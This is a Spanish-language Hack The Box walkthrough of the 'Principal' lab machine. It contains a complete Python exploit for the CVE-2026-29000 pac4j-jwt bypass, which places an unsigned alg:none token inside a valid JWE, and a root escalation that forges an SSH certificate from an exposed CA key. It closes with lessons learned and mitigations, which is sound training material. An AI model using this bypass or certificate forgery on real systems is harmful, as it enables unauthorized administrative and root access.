---
title: "HTB Walkthrough: Principal"
date: 2026-04-14
draft: false
description: "Walkthrough completo de la máquina Principal de Hack The Box. Dificultad Medium, OS Linux (Ubuntu 24.04 LTS). CVE-2026-29000 JWT bypass, credenciales expuestas y escalada por SSH Certificate Forgery."
tags: ["HackTheBox", "Linux", "Medium", "JWT", "JWE", "SSH", "CVE-2026-29000", "pac4j", "PrivEsc", "CertificateForge", "principal", "writeups"]
categories: ["HTB Walkthroughs"]
series: ["HackTheBox CPTS"]
---

{{< lead >}}
Resolución paso a paso de **Principal** en Hack The Box. Máquina de dificultad **Medium** con sistema operativo **Linux (Ubuntu 24.04 LTS)**. Encadenamos un bypass de autenticación JWT mediante CVE-2026-29000, extracción de credenciales desde un dashboard administrativo y escalada de privilegios a root forjando un certificado SSH con la CA privada del servidor.
{{< /lead >}}

{{< badge >}}HackTheBox{{< /badge >}}
{{< badge >}}Linux{{< /badge >}}
{{< badge >}}Medium{{< /badge >}}

> ⚠️ **Esta máquina está retirada.** Los writeups públicos solo están permitidos sobre máquinas retiradas según las [normas de la comunidad HTB](https://help.hackthebox.com/en/articles/5188925-streaming-writeups-walkthrough-guidelines).

---

## 🗺️ Información de la Máquina

| Campo          | Detalle                                                              |
|----------------|----------------------------------------------------------------------|
| **Nombre**     | Principal                                                            |
| **OS**         | Linux (Ubuntu 24.04 LTS)                                             |
| **Dificultad** | Medium                                                               |
| **IP**         | 10.129.244.220                                                       |
| **Técnicas**   | CVE-2026-29000 · PlainJWT Bypass · SSH Certificate Forgery · Credential Exposure |

---

## 1. Reconocimiento

### 1.1 Escaneo de Puertos

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.244.220
```

```
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
```

Solo dos puertos. Lanzamos un escaneo de versiones sobre ellos:

```bash
nmap -sC -sV -p22,8080 10.129.244.220
```

```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.14
8080/tcp open  http-proxy Jetty
| http-title: Principal Internal Platform - Login
|_Requested resource was /login
| X-Powered-By: pac4j-jwt/6.0.3
```

*Puertos abiertos:*
- `22` → OpenSSH 9.6p1 (sin CVEs relevantes — destino final, no punto de entrada)
- `8080` → Jetty con **pac4j-jwt/6.0.3**

> **💡 Dato clave:** La cabecera `X-Powered-By: pac4j-jwt/6.0.3` es information disclosure — revela la librería de autenticación y su versión exacta, lo que nos permite buscar CVEs directamente. Siempre revisar las cabeceras HTTP de respuesta durante la enumeración.

### 1.2 Enumeración Web

Navegamos a `http://10.129.244.220:8080` y encontramos un formulario de login corporativo. Sin credenciales, pasamos a analizar lo que está disponible públicamente.

Los archivos JS del lado del cliente son una fuente de inteligencia importante: los desarrolladores frecuentemente dejan endpoints, estructuras de datos y comentarios que describen la arquitectura interna. El archivo `/static/js/app.js` revela todo lo que necesitamos:

```js
const JWKS_ENDPOINT      = '/api/auth/jwks';  // Clave pública RSA — acceso público
const AUTH_ENDPOINT      = '/api/auth/login';
const DASHBOARD_ENDPOINT = '/api/dashboard';
const SETTINGS_ENDPOINT  = '/api/settings';

const ROLES = {
    ADMIN:   'ROLE_ADMIN',
    MANAGER: 'ROLE_MANAGER',
    USER:    'ROLE_USER'
};

// Token handling:
//   - Tokens are JWE-encrypted using RSA-OAEP-256 + A128GCM
//   - Public key available at /api/auth/jwks for token verification
//   - Inner JWT is signed with RS256
//
// JWT claims schema:
//   sub  - username
//   role - one of: ROLE_ADMIN, ROLE_MANAGER, ROLE_USER
//   iss  - "principal-platform"
```

### 1.3 Arquitectura de Autenticación

El sistema usa **JWE** (JSON Web Encryption), que es un JWT cifrado. La estructura es:

```
JWE (capa externa — cifrado RSA-OAEP-256 con clave pública del servidor)
  └── JWT firmado con RS256 (capa interna — los claims reales: usuario, rol, etc.)
```

Esto implica dos operaciones separadas: primero el servidor descifra el JWE, luego verifica la firma del JWT interior. Esta separación es exactamente lo que el CVE va a explotar.

La clave pública RSA está disponible sin autenticación en `/api/auth/jwks`:

```bash
curl http://10.129.244.220:8080/api/auth/jwks
```

```json
{
  "keys": [{ "kty": "RSA", "use": "enc", "kid": "enc-key-1", "n": "0vx7ago...", "e": "AQAB" }]
}
```

Esta clave nos permite cifrar nosotros mismos la capa JWE — el servidor podrá descifrarla (tiene la clave privada), pero el JWT que metamos dentro estará bajo nuestro control.

> **💡 Conclusiones:** Tenemos la clave pública RSA para cifrar tokens, conocemos la estructura exacta de los claims y sabemos que el campo `role` controla el acceso. Si logramos que el servidor acepte un token con `ROLE_ADMIN` sin verificar la firma del JWT interior, tenemos acceso total.

---

## 2. Explotación — CVE-2026-29000

### 2.1 Análisis de la Vulnerabilidad

La versión **pac4j-jwt 6.0.3** es vulnerable a este CVE (afecta versiones anteriores a 4.5.9, 5.7.9 y 6.3.3). El fallo está en cómo pac4j procesa los tokens JWE cuando el JWT interno es un **PlainJWT** (`"alg": "none"` — sin firma).

**¿Cómo funciona el ataque?**

En condiciones normales, pac4j descifra el JWE y luego verifica la firma del JWT interno. El bug ocurre cuando el JWT interior tiene `alg: none`: la función `toSignedJWT()` devuelve `null` en lugar de lanzar una excepción, y el código que la llama no comprueba ese `null` antes de continuar. El resultado es que pac4j extrae los claims del PlainJWT **sin haber verificado ninguna firma**, aceptando cualquier `role` que el atacante haya puesto.

```
Flujo normal:    JWE válido → JWT firmado RS256 → verificar firma → extraer claims
Flujo malicioso: JWE válido → PlainJWT (alg:none) → toSignedJWT() = null → claims aceptados sin verificación
```

La clave del bypass: ciframos la capa JWE con la **clave pública real del servidor**, así que el descifrado externo es completamente válido. El problema está en el interior.

### 2.2 Script de Explotación

Exploit disponible en: [CVE-2026-29000 PoC](https://github.com/advisories/CVE-2026-29000)

```bash
pip install jwcrypto requests
```

```python
#!/usr/bin/env python3
"""
CVE-2026-29000 — pac4j-jwt PlainJWT Authentication Bypass
Uso: python3 cve.py http://10.129.244.220:8080
"""

import json, time, base64, requests, sys
from jwcrypto import jwk, jwe

TARGET_URL         = sys.argv[1].rstrip('/')
JWKS_ENDPOINT      = f"{TARGET_URL}/api/auth/jwks"
PROTECTED_ENDPOINT = f"{TARGET_URL}/api/dashboard"

def b64_encode(data):
    # Base64 URL-safe sin padding — formato requerido por el estándar JWT
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

# 1. Obtener la clave pública RSA del endpoint público
print(f"[*] Obteniendo clave pública de {JWKS_ENDPOINT}...")
r = requests.get(JWKS_ENDPOINT, timeout=10)
key_data   = r.json()['keys'][0]
public_key = jwk.JWK(**key_data)
print(f"[+] Clave RSA '{key_data.get('kid')}' cargada.")

# 2. Claims maliciosos con ROLE_ADMIN
now = int(time.time())
claims = {
    "sub":  "admin#override",
    "role": "ROLE_ADMIN",           # El claim que nos da acceso total
    "iss":  "principal-platform",   # Debe coincidir con lo que espera el servidor
    "iat":  now,
    "exp":  now + 3600
}

# 3. Construir el PlainJWT (alg: none — sin firma)
# Formato: base64(header).base64(payload).
# El punto final vacío indica ausencia de firma
header_plain     = b64_encode(json.dumps({"alg": "none"}).encode())
payload_plain    = b64_encode(json.dumps(claims).encode())
plain_jwt_string = f"{header_plain}.{payload_plain}."

# 4. Envolver el PlainJWT en un JWE cifrado con la clave pública real del servidor
# La capa exterior es criptográficamente válida — el servidor puede descifrarla.
# Pero el JWT interior no tiene firma: aquí está el bypass.
jwe_header = {
    "alg": "RSA-OAEP-256",
    "enc": "A256GCM",
    "cty": "JWT",           # Indica al servidor que el contenido descifrado es un JWT
    "kid": key_data.get('kid')
}
jwe_obj = jwe.JWE(
    plain_jwt_string.encode(),
    recipient=public_key,
    protected=json.dumps(jwe_header)
)
malicious_token = jwe_obj.serialize(compact=True)
print("[+] Token JWE malicioso generado.")

# 5. Enviar el token al endpoint protegido
headers = {"Authorization": f"Bearer {malicious_token}"}
resp    = requests.get(PROTECTED_ENDPOINT, headers=headers)

print(f"\n[!] TOKEN PARA EL NAVEGADOR:\n{malicious_token}\n")
print(f"Status: {resp.status_code}")
if resp.status_code == 200:
    print("[!!!] BYPASS EXITOSO — Acceso como ADMIN")
    print(resp.text)
```

### 2.3 Ejecución

```bash
python3 cve.py http://10.129.244.220:8080
```

```
[*] Obteniendo clave pública de http://10.129.244.220:8080/api/auth/jwks...
[+] Clave RSA 'enc-key-1' cargada.
[+] Token JWE malicioso generado.

Status: 200
[!!!] BYPASS EXITOSO — Acceso como ADMIN
```

La respuesta del dashboard incluye el log de actividad del sistema. Entre las entradas encontramos:

```json
{
  "action": "CERT_ISSUED",
  "username": "svc-deploy",
  "details": "SSH certificate issued for deploy-1735400000",
  "timestamp": "2026-03-05T21:43:40.443553"
}
```

El usuario `svc-deploy` gestiona autenticación SSH mediante certificados — candidato directo para el acceso inicial.

### 2.4 Acceso al Dashboard desde el Navegador

Para explorar la interfaz como administrador, inyectamos el token en el Session Storage del navegador (donde la aplicación SPA almacena el token de sesión):

1. Abrir `http://10.129.244.220:8080/login` → **F12** → **Application** → **Session Storage**
2. Crear entrada: **Key** `auth_token` / **Value** (pegar el token del script)
3. Navegar a `http://10.129.244.220:8080/dashboard`

En la sección **Settings** encontramos credenciales del sistema en texto claro:

```
encryptionKey: D3pl0y_$$H_Now42!
sshCertAuth:   enabled
sshCaPath:     /opt/principal/ssh/
```

> **🔑 Cruzando el usuario `svc-deploy` del log con la contraseña del Settings, tenemos credenciales SSH directas.**

---

## 3. User Flag

```bash
ssh svc-deploy@10.129.244.220
# Password: D3pl0y_$$H_Now42!
```

```
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-101-generic x86_64)
svc-deploy@principal:~$
```

```bash
svc-deploy@principal:~$ cat user.txt
```

> 🔑 Flag de usuario obtenida.

---

## 4. Escalada de Privilegios

### 4.1 Enumeración del Sistema

```bash
svc-deploy@principal:~$ sudo -l
Sorry, user svc-deploy may not run sudo on principal.

svc-deploy@principal:~$ id
uid=1001(svc-deploy) gid=1001(svc-deploy) groups=1001(svc-deploy),1002(deployers)
```

Sin `sudo`, pero el usuario pertenece al grupo `deployers`. Buscamos qué recursos son accesibles para ese grupo:

```bash
svc-deploy@principal:~$ find / -group deployers 2>/dev/null
```

```
/etc/ssh/sshd_config.d/60-principal.conf
/opt/principal/ssh
/opt/principal/ssh/README.txt
/opt/principal/ssh/ca          ← Clave privada de la CA de SSH
```

El archivo `/opt/principal/ssh/ca` es una **clave privada de Autoridad Certificadora SSH** accesible para nuestro grupo. Esto es crítico.

### 4.2 Análisis de la Configuración SSH

SSH puede autenticar usuarios mediante **certificados** firmados por una CA. El servidor define en su configuración qué CA es de confianza, y acepta la conexión de cualquier usuario cuyo certificado haya sido firmado por ella. Quien controle la clave privada de la CA puede firmar certificados para **cualquier usuario del sistema**, incluyendo `root`.

```bash
svc-deploy@principal:~$ cat /etc/ssh/sshd_config.d/60-principal.conf
```

```
PubkeyAuthentication yes
PasswordAuthentication yes
PermitRootLogin prohibit-password
TrustedUserCAKeys /opt/principal/ssh/ca.pub
```

- **`TrustedUserCAKeys /opt/principal/ssh/ca.pub`** → El servidor confía en cualquier certificado firmado por esta CA. Tenemos lectura sobre la clave privada correspondiente.
- **`PermitRootLogin prohibit-password`** → Root no puede autenticarse con contraseña, pero **sí puede con certificado**.

La misconfiguration crítica es la **ausencia de `AuthorizedPrincipalsFile`**. Sin ella, el único control de acceso es que el *principal* del certificado (el campo que declara "este certificado es para el usuario X") coincida con el usuario al que se intenta conectar. No hay ninguna lista que limite qué principales son válidos para cada cuenta — si firmamos un certificado con `root` como principal, SSH lo acepta.

> **💡 El mismo patrón que el CVE:** el sistema verifica la envoltura criptográfica (el certificado está firmado por la CA de confianza), pero no controla la afirmación de identidad interior (el principal del certificado). En ambos vectores de esta máquina, verificar la capa exterior da una falsa sensación de seguridad.

### 4.3 Forja del Certificado SSH

**Paso 1 — Generar un par de claves temporal:**

```bash
svc-deploy@principal:/tmp$ ssh-keygen -t ed25519 -f /tmp/paw -N ""
```

Generamos las claves en `/tmp` con passphrase vacía para no necesitar interacción.

**Paso 2 — Firmar la clave pública con la CA privada, especificando `root` como principal:**

```bash
svc-deploy@principal:/tmp$ ssh-keygen -s /opt/principal/ssh/ca \
    -I "pwa-root" \
    -n root \
    -V +1h \
    /tmp/paw.pub
```

- **`-s /opt/principal/ssh/ca`** → Clave privada de la CA. Sin este archivo, la escalada sería imposible.
- **`-I "pwa-root"`** → Identificador del certificado (arbitrario, aparece en logs).
- **`-n root`** → **El principal del certificado.** Declara que este certificado autoriza el acceso a `root`. Sin `AuthorizedPrincipalsFile`, SSH acepta esta declaración sin restricciones adicionales.
- **`-V +1h`** → Validez de 1 hora.

```
Signed user key /tmp/paw-cert.pub: id "pwa-root" serial 0 for root valid from 2026-04-14T09:51:00 to 2026-04-14T10:51:59
```

**Paso 3 — Verificar el certificado:**

```bash
svc-deploy@principal:/tmp$ ssh-keygen -L -f /tmp/paw-cert.pub
```

```
/tmp/paw-cert.pub:
        Type: ssh-ed25519-cert-v01@openssh.com user certificate
        Signing CA: RSA SHA256:bExSfFTUaopPXEM+lTW6QM0uXnsy7CICk0+p0UKK3ps
        Key ID: "pwa-root"
        Valid: from 2026-04-14T09:51:00 to 2026-04-14T10:51:59
        Principals:
                root
        Extensions:
                permit-pty
                permit-port-forwarding
                ...
```

El certificado está firmado por la CA correcta y declara `root` como principal.

**Paso 4 — Conectarse como root:**

```bash
svc-deploy@principal:/tmp$ ssh -i /tmp/paw root@localhost
```

SSH detecta automáticamente el certificado `/tmp/paw-cert.pub`. El servidor verifica que está firmado por la CA de confianza, que el principal `root` coincide con el usuario solicitado, y abre la sesión.

```
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-101-generic x86_64)
root@principal:~#
```

✅ **Root obtenido mediante certificado SSH forjado.**

---

## 5. Root Flag

```bash
root@principal:~# cat /root/root.txt
```

> 🏁 Flag de root obtenida.

---

## 6. Resumen y Lecciones Aprendidas

**Ruta de compromiso:**

1. **Recon** → `X-Powered-By: pac4j-jwt/6.0.3` — information disclosure directo a CVE.
2. **Enumeración web** → JS del frontend revela arquitectura JWE/JWT, endpoint JWKS público y estructura de claims.
3. **CVE-2026-29000** → PlainJWT (`alg:none`) dentro de JWE válido bypasea la verificación de firma → `ROLE_ADMIN`.
4. **Dashboard** → Log revela usuario `svc-deploy`; Settings expone contraseña en texto claro.
5. **Foothold** → SSH con credenciales directas → `user.txt`.
6. **PrivEsc** → Grupo `deployers` tiene lectura sobre la CA privada SSH + `TrustedUserCAKeys` sin `AuthorizedPrincipalsFile` → certificado forjado con principal `root` → `root.txt`.

**Lo que aprendí con esta máquina:**

- **Las cabeceras HTTP revelan mucho.** `X-Powered-By` con versión exacta es el punto de partida de toda la cadena. Siempre revisar las cabeceras de respuesta durante la enumeración.

- **El JS del frontend no es decoración.** Los comentarios del desarrollador describían la arquitectura entera de autenticación. Todo lo que se sirve al navegador puede leerlo el atacante.

- **CVE-2026-29000: el principio "fail securely".** El bug no es criptográfico — RSA-OAEP y AES-GCM son seguros. El fallo es que `toSignedJWT()` devuelve `null` silenciosamente ante un PlainJWT en lugar de lanzar excepción. Un sistema seguro debe denegar el acceso ante cualquier condición anómala, nunca concederlo por defecto.

- **`TrustedUserCAKeys` sin `AuthorizedPrincipalsFile` es una bomba de tiempo.** La primera directiva define quién puede firmar certificados de confianza; la segunda limita qué identidades son válidas para cada usuario. Sin la segunda, cualquiera con la CA privada puede acceder como cualquier usuario del sistema.

- **`PermitRootLogin prohibit-password` no protege contra certificados.** Solo bloquea fuerza bruta de contraseñas. La protección correcta es `PermitRootLogin no` + `sudo` auditado.

- **Los secretos nunca deben estar en la UI.** La contraseña visible en el Settings del dashboard es el error que convierte el bypass de auth en acceso completo al sistema. Los secretos deben vivir en un vault (HashiCorp Vault, AWS Secrets Manager), nunca en la base de datos de la aplicación.

**Mitigaciones:**

| Vector | Mitigación |
|--------|------------|
| Information disclosure (`X-Powered-By`) | Eliminar o generalizar cabeceras que revelan tecnología y versión |
| CVE-2026-29000 (PlainJWT bypass) | Actualizar pac4j-jwt a ≥ 6.3.3; rechazar `alg: none` explícitamente |
| JWKS sin restricciones | Proteger `/api/auth/jwks` por IP o con autenticación |
| Credenciales en texto claro en la UI | Usar un gestor de secretos; nunca exponer valores en la interfaz |
| CA privada legible por grupo de servicio | Almacenar en HSM o vault; sin permisos de lectura para cuentas de servicio |
| `TrustedUserCAKeys` sin `AuthorizedPrincipalsFile` | Configurar `AuthorizedPrincipalsFile` limitando principals por usuario; sin principals válidos para `root` |
| `PermitRootLogin prohibit-password` | Cambiar a `PermitRootLogin no` + gestión de acceso root mediante `sudo` auditado |